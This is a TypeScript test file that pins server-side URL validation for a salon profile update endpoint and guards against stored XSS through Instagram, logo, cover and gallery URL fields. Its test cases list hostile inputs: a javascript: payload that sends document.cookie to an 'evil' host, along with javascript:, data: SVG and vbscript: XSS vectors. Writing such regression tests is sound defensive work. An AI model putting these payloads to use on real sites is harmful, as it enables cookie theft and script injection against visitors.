/**
 * Security pins for `salon.updateSalonProfile` URL fields.
 *
 * The PublicProfileEditor (admin-app) does client-side validation, but a
 * malicious tenant_owner can craft a tRPC POST that bypasses the form. The
 * server schema MUST reject:
 *
 *   • `instagramUrl` schemes other than `https://(www.)?instagram.com/`
 *     — otherwise `javascript:fetch(...)` lands in tenants.instagram_url
 *     and the public salon page (`SalonProfileClient.tsx`) renders it as
 *     `<a href={profile.instagramUrl}>`. Every visitor who clicks the
 *     Instagram chip executes JS in the manicbot.com origin.
 *
 *   • `logo` / `coverPhoto` schemes other than `https://` — `z.string().url()`
 *     alone permits `javascript:` because WHATWG URL parses it. The fields
 *     flow into og:image and JSON-LD; the moment any future PR renders one
 *     as `<a href>` the validation gap becomes a stored XSS.
 *
 *   • `photos[]` entries with schemes other than `https://` (U1/U2) — the
 *     gallery array was `z.array(z.string())` with no per-element guard, so a
 *     crafted tRPC POST could store `javascript:` / `data:` / `vbscript:` URLs
 *     in `tenants.photos`. Those JSON-parsed strings are reflected by every
 *     `publicSalon` read (search cards, profile, chat) into the public gallery
 *     `<img src>`. A single bad entry must reject the whole mutation.
 *
 * Pre-fix: instagramUrl was `z.string().max(300)` only; logo/coverPhoto
 * were `z.string().url()`; photos was `z.array(z.string())`. This test fails
 * on those laxer schemas and passes once the scheme guards are tightened.
 */
import { describe, it, expect, vi, beforeEach, afterEach } from "vitest";

vi.mock("~/server/db", () => ({ getDb: () => null }));
vi.mock("~/env", () => ({
  env: {
    WORKER_PUBLIC_URL: "https://worker.test",
    ADMIN_KEY: "test-admin-key",
    ADMIN_CHAT_ID: "12345",
    TELEGRAM_BOT_TOKEN: "0:TEST",
    AUTH_SECRET: "test-secret",
    BOT_ENCRYPTION_KEY: "0123456789abcdef0123456789abcdef0123456789abcdef",
  },
}));

import { TRPCError } from "@trpc/server";
import { createCallerFactory } from "~/server/api/trpc";
import { salonRouter } from "~/server/api/routers/salon";
import { createDbMock, makeTenantOwnerCtx } from "./helpers/db-mock";

const createCaller = createCallerFactory(salonRouter);

function makeCallerForTenant(tenantId = "t_owner") {
  // The not-found tenant lookup at the top of updateSalonProfile expects a
  // tenant row to exist; provide one so the URL guard fires (not a 404).
  const { db, updateCalls } = createDbMock([
    [{ id: tenantId, name: "Studio", slug: "studio", salon: "{}" }],
  ]);
  const caller = createCaller(makeTenantOwnerCtx(db, tenantId) as never);
  return { caller, updateCalls };
}

describe("salon.updateSalonProfile — URL hardening (security)", () => {
  beforeEach(() => { vi.clearAllMocks(); });
  afterEach(() => { vi.restoreAllMocks(); });

  describe("instagramUrl", () => {
    it.each([
      "javascript:fetch('//evil/'+document.cookie)",
      "data:text/html,<script>alert(1)</script>",
      "http://instagram.com/salon",                // bare http
      "https://evil.example.com/instagram.com/x",  // wrong host
      "https://fakeinstagram.com/x",               // typosquat
    ])("rejects %j", async (badUrl) => {
      const { caller } = makeCallerForTenant();
      await expect(
        caller.updateSalonProfile({ tenantId: "t_owner", instagramUrl: badUrl } as never),
      ).rejects.toMatchObject({ code: "BAD_REQUEST" });
    });

    it.each([
      "https://instagram.com/myunique_salon",
      "https://www.instagram.com/myunique.salon/",
      "",                          // clearing the field
    ])("accepts %j", async (goodUrl) => {
      const { caller, updateCalls } = makeCallerForTenant();
      await expect(
        caller.updateSalonProfile({ tenantId: "t_owner", instagramUrl: goodUrl } as never),
      ).resolves.toBeTruthy();
      // The mutation must have written the value (or null for empty) to D1.
      // We don't pin the exact column name here; just confirm the update fired.
      expect(updateCalls.length).toBeGreaterThan(0);
    });
  });

  describe("logo / coverPhoto", () => {
    it.each([
      ["logo", "javascript:alert(1)"],
      ["logo", "data:image/svg+xml;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="],
      ["coverPhoto", "javascript:alert(1)"],
      ["coverPhoto", "http://example.com/cover.png"], // bare http
    ])("rejects %s = %j", async (field, badUrl) => {
      const { caller } = makeCallerForTenant();
      await expect(
        caller.updateSalonProfile({ tenantId: "t_owner", [field]: badUrl } as never),
      ).rejects.toMatchObject({ code: "BAD_REQUEST" });
    });

    it.each([
      ["logo", "https://cdn.example.com/logo.png"],
      ["coverPhoto", "https://cdn.example.com/cover.jpg"],
    ])("accepts %s = %j", async (field, goodUrl) => {
      const { caller } = makeCallerForTenant();
      await expect(
        caller.updateSalonProfile({ tenantId: "t_owner", [field]: goodUrl } as never),
      ).resolves.toBeTruthy();
    });

    it("accepts empty string (field clear)", async () => {
      const { caller } = makeCallerForTenant();
      await expect(
        caller.updateSalonProfile({ tenantId: "t_owner", logo: "", coverPhoto: "" } as never),
      ).resolves.toBeTruthy();
    });
  });

  describe("photos[] gallery (U1/U2)", () => {
    // A single dangerous entry must fail the whole array — the gallery is
    // JSON-stringified verbatim into tenants.photos, so a partial accept would
    // still persist the malicious URL.
    it.each([
      "javascript:alert(1)",
      "JaVaScRiPt:alert(1)",                                  // case-obfuscated
      "data:image/svg+xml;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
      "vbscript:msgbox(1)",
      "http://example.com/p.png",                             // bare http
      " javascript:alert(1)",                                 // leading whitespace
    ])("rejects a gallery containing %j", async (badUrl) => {
      const { caller } = makeCallerForTenant();
      await expect(
        caller.updateSalonProfile({
          tenantId: "t_owner",
          // mix a legit URL with the bad one to prove per-element validation
          photos: ["https://cdn.example.com/ok.png", badUrl],
        } as never),
      ).rejects.toMatchObject({ code: "BAD_REQUEST" });
    });

    it("accepts an all-https gallery", async () => {
      const { caller, updateCalls } = makeCallerForTenant();
      await expect(
        caller.updateSalonProfile({
          tenantId: "t_owner",
          photos: ["https://cdn.example.com/a.jpg", "https://cdn.example.com/b.jpg"],
        } as never),
      ).resolves.toBeTruthy();
      expect(updateCalls.length).toBeGreaterThan(0);
    });

    it("accepts an empty gallery (clearing all photos)", async () => {
      const { caller } = makeCallerForTenant();
      await expect(
        caller.updateSalonProfile({ tenantId: "t_owner", photos: [] } as never),
      ).resolves.toBeTruthy();
    });
  });
});
